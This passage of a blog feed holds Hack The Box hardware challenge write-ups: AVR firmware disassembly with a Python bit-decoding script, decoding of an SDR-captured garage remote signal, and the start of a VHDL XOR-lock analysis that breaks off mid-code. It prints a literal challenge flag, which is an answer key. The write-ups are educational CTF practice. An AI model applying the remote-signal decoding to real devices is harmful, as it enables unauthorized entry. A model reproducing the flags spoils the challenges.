+>&lt;/p></description></item><item><title>HTB HW Challenge: Bare Metal</title><link>https://Kvn11.github.io/p/bare-metal/</link><pubDate>Sun, 07 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/bare-metal/</guid><description>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge: Bare Metal" />&lt;blockquote>
+&lt;p>&lt;strong>Challenge Description&lt;/strong>: Concerned about the integrity of devices produced at a remote fabrication plant, management has ordered a review of our production line.
+This revealed many things, including a weird embedded device in one of our serial networks.
+In attempting to remove it, we accidentally triggered a hardware failsafe, which resulted in the device stopping working.
+However, luckily we extracted the firmware prior to doing so. We need to find out what it did to the slave device it was tapped into, can you help us?
+The microcontroller of the device appears to be an atmega328p.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="walkthrough">Walkthrough
+&lt;/h2>&lt;p>We are given the file &lt;code>extracted_firmware.hex&lt;/code> which contains the hex strings of the data.
+A quick google search tells us that we can use the &lt;code>avr-objdump&lt;/code> to get the disassembly of this binary blob.&lt;/p>
+&lt;p>&lt;code>avr-objdump -s -m avr5 extracted_firmware.hex -D&lt;/code>&lt;/p>
+&lt;p>Looking at the disassembly, it seems that there are a lot of repeated instructions, but there are a few sections where the code is different.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_1.png"
+width="458"
+height="233"
+srcset="https://Kvn11.github.io/p/bare-metal/img/img_1_hu01dc96bb05787037390d276ea6159f84_66423_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_1_hu01dc96bb05787037390d276ea6159f84_66423_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="First interesting section"
+class="gallery-image"
+data-flex-grow="196"
+data-flex-basis="471px"
+>&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_2.png"
+width="458"
+height="295"
+srcset="https://Kvn11.github.io/p/bare-metal/img/img_2_hu8cea776933b49c35db5e3f1b56c65c51_84581_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_2_hu8cea776933b49c35db5e3f1b56c65c51_84581_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Second interesting section"
+class="gallery-image"
+data-flex-grow="155"
+data-flex-basis="372px"
+>&lt;/p>
+&lt;p>We can analyze the repeated sections first to get an idea of what its repeatedly doing.&lt;/p>
+&lt;p>There seems to be two instructionst that repeated, &lt;code>cbi&lt;/code> and &lt;code>sbi&lt;/code> and they are working on the registers at &lt;code>0x0A&lt;/code> and &lt;code>0x0B&lt;/code>.&lt;/p>
+&lt;p>Looking at the datasheet we can see that these are the &lt;code>DDRD&lt;/code> and &lt;code>PORTD&lt;/code> registers respectively.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_3.png"
+width="656"
+height="76"
+srcset="https://Kvn11.github.io/p/bare-metal/img/img_3_hua2f673180a250a5ffd6860579d614014_18242_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_3_hua2f673180a250a5ffd6860579d614014_18242_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Registers"
+class="gallery-image"
+data-flex-grow="863"
+data-flex-basis="2071px"
+>&lt;/p>
+&lt;p>The &lt;code>cbi&lt;/code> instruction clears a bit in the register, and &lt;code>sbi&lt;/code> sets the bit.
+Reading about the pin configuration reveals more information as well.&lt;/p>
+&lt;blockquote>
+&lt;p>The DDxn bit in the DDRx register selects the direction of this pin.
+If DDxn is written logic one, Pxn is configured as an output pin.
+If DDxn is written logic zero, Pxn is configured as an input pin.&lt;/p>
+&lt;/blockquote>
+&lt;p>Thus based on this, we know that the instruction at address &lt;code>0x86&lt;/code> is writing logic zero to &lt;code>DDD4&lt;/code>, meaning that &lt;code>PIND4&lt;/code> is configured as an input pin.
+However, this isn&amp;rsquo;t as interesting as the data being written to the &lt;code>PORTD&lt;/code> data register, which presumably holds the data to be sent as output.
+The instructions:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">54 98 cbi 0x0a, 4 ; 10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5f 9a sbi 0x0b, 7 ; 11
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5f 98 cbi 0x0b, 7 ; 11
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>seems to clear the USART internal clock, then seems to toggle bit 7 of Port D, which can either be the analog comparator negative input, or the pin change interrupt source 23.
+I wrote a python script to visualize the changes in the register bits for the rest of the instructions, which helped me see that Port D6 was changing in a repeated pattern, while Port D5 was not changing in a discernable pattern.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_4.png"
+width="835"
+height="55"
+srcset="https://Kvn11.github.io/p/bare-metal/img/img_4_hude9e9e9b5421173dcb3064d4291cce47_16504_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_4_hude9e9e9b5421173dcb3064d4291cce47_16504_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Pattern is visible"
+class="gallery-image"
+data-flex-grow="1518"
+data-flex-basis="3643px"
+>&lt;/p>
+&lt;p>Bit 6 seems to be alternating between 0 and 1 so I don&amp;rsquo;t think it would have anything interesting to show.
+Since bit 5 looks more random, I decided to try figure out what it creates.
+Since this is probably transmitting over UART or some type of serial interface, I figured I should start there for visualizing it.&lt;/p>
+&lt;p>In the end, this was my solution for pulling getting the flag.
+For the script to work, you need to isolate the big chunk of &lt;code>cbi&lt;/code> and &lt;code>sbi&lt;/code> instructions and ignore the others.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python3" data-lang="Python3">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;disassembly.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readlines&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">instr&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">lines&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">reg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process_instr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">op&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;cbi&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_5&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">op&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;sbi&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_5&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">characters&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">bit_5&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b_string&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">ctr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">characters&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b_string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">characters&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">process_instr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">values&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">operands&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;, &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">operands&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">operands&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">cbi_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">register&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bit&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">register&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">sbi_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">register&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bit&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">register&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The flag is: &lt;code>HTB{817_84n91n9_15_3v32ywh323!@#$%}&lt;/code>&lt;/p></description></item><item><title>HTB HW Challenge RFlag</title><link>https://Kvn11.github.io/p/htb-hw-challenge-rflag/</link><pubDate>Thu, 04 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-rflag/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge RFlag" />&lt;blockquote>
+&lt;p>&lt;strong>Challenge Description&lt;/strong>: We have found the garage where some cyber criminals have all their stuff.
+Using an SDR device, we captured the signal from the remote key that opens the garage.
+Can you help us to analyze it?&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="walkthrough">Walkthrough
+&lt;/h2>&lt;p>The challenge zip file contains &lt;code>signal.cf32&lt;/code> which can be opened with inspectrum.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_1.png"
+width="1258"
+height="598"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_1_hu833c2a68a9ff553eddcfc75dd92c4059_1151536_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_1_hu833c2a68a9ff553eddcfc75dd92c4059_1151536_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Opened signal capture"
+class="gallery-image"
+data-flex-grow="210"
+data-flex-basis="504px"
+>&lt;/p>
+&lt;p>We can increase the FFT size, power max, and power min settings to get a more clear view of the signals.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_2.png"
+width="1258"
+height="719"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_2_hu8ef0c633dd5f362bd3828bff3e270cb9_92176_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_2_hu8ef0c633dd5f362bd3828bff3e270cb9_92176_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Better view"
+class="gallery-image"
+data-flex-grow="174"
+data-flex-basis="419px"
+>&lt;/p>
+&lt;p>Then we can right click on the bright signal segments and add an amplitude plot.
+We need to shrink our window to reduce noise.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_3.png"
+width="1919"
+height="1034"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_3_hu7a0d62733e874bd05ec1bc554e21d67a_134230_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_3_hu7a0d62733e874bd05ec1bc554e21d67a_134230_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Amplitude plot"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="445px"
+>&lt;/p>
+&lt;p>Now we right click on our amplitude plot, and select &lt;code>Add derived plot -&amp;gt; add threshold plot&lt;/code> to get our plot of 1&amp;rsquo;s and 0&amp;rsquo;s.
+We also enable the cursors so we can start describing what will determine a 1 and what will determine a 0.
+Then we can increase the amount of cursors until we have covered the entire capture.
+Doesn&amp;rsquo;t need to be perfectly lined up.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_4.png"
+width="1919"
+height="1034"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_4_hu57485597eaf5a9c97f9f439974a8cdbf_724526_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_4_hu57485597eaf5a9c97f9f439974a8cdbf_724526_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Creating our bits"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="445px"
+>&lt;/p>
+&lt;p>To export the bits, we need to right click on the threshold plot, and then select extract symbols to stdout.
+I removed the whitespace and comma&amp;rsquo;s so that I could use it with an online machenster decoding tool.
+You can figure out this is manchester encoded due to the bit patterns.
+The bits are always going from high to low, or low to high, but never high to high or low to low.
+You can use &lt;a class="link" href="https://dcode.fr/manchester-code" target="_blank" rel="noopener"
+>dcode.fr/manchester-code&lt;/a> to decode the bits into their final form.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_5.png"
+width="990"
+height="503"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_5_hue12044070bd80f8d25532e4d8fe338a7_208850_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_5_hue12044070bd80f8d25532e4d8fe338a7_208850_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Manchester decoded"
+class="gallery-image"
+data-flex-grow="196"
+data-flex-basis="472px"
+>&lt;/p>
+&lt;p>After we have the final decoded bits, we can use CyberChef to convert the bits to text.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_6.png"
+width="1140"
+height="534"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_6_huc87c1bdbf6611403c71799c2524e3c4d_40563_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_6_huc87c1bdbf6611403c71799c2524e3c4d_40563_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="213"
+data-flex-basis="512px"
+>&lt;/p></description></item><item><title>HTB HW Challenge VHDLock</title><link>https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/</link><pubDate>Wed, 03 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge VHDLock" />&lt;blockquote>
+&lt;p>&lt;strong>Challenge Description&lt;/strong>: We found ourselves locked in an escape room, with the clock ticking down and only one puzzle to solve.
+The final challenge involves opening the door, and the clue provided to use by the game master is that the key for the encrypted password is a 4-byte sequence.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="walkthrough">Walkthrough
+&lt;/h2>&lt;p>The challenge download gives us two files &lt;code>lock.vhd&lt;/code> and &lt;code>out.txt&lt;/code>.
+The second file is presumably the output of the first, and contains two columns of values.
+At first glance the first file appears to be a Virtual Hard Disk, but based on the name of the challenge and a quick search of the import &lt;code>use ieee.std_logic_1164.all&lt;/code>, it can be determined that this is a VHDL file.
+If you want to learn more about VHDL files, and how to write/read them, I recommend this playlist:
+&lt;a class="link" href="https://www.youtube.com/watch?v=h4ZXge1BE80" target="_blank" rel="noopener"
+>Your first VHDL Program&lt;/a>.&lt;/p>
+&lt;p>The first part of this file is creating an &lt;code>xor_get&lt;/code> function that takes 2 inputs, each 2 bytes wide, XOR&amp;rsquo;s them, and outputs the 2 byte result to &lt;code>output&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/1.png"
+width="734"
+height="376"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/1_huedba0fb69b937a1a57823c37c7b1e252_119357_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/1_huedba0fb69b937a1a57823c37c7b1e252_119357_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="First part of lock.vhd"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="468px"
+>&lt;/p>
+&lt;p>The second component takes in a 4 but value and maps it to a 16 bit value. This value is given to &lt;code>output&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/2.png"
+width="858"
+height="804"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/2_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/2_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Second part of lock.vhd"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="256px"
+>&lt;/p>
+&lt;p>The last component of the file is where the process of generating &lt;code>out.txt&lt;/code> can be explained.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/3.png"
+width="858"
+height="804"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/3_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/3_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Third part of lock.vhd"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="256px"
+>&lt;/p>
+&lt;p>The &lt;code>main&lt;/code> entity describes the inputs we can expect.
+2 4-bit values, along with a 2 byte XOR key, and it will have 2 2-byte outputs, seen in &lt;code>out.txt&lt;/code>.
+Our 2 4-bit values are translated into a 16-bit value, and then those values are XOR&amp;rsquo;d against the unknown key.
+However, given that HackTheBox flags always have the format &lt;code>HTB{...}&lt;/code> we can assume to know the first 4 inputs.
+Since we now know the 2 of the 3 values used in the XOR operation used to generate the outputs, we can derive the 4 byte key using the following process:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
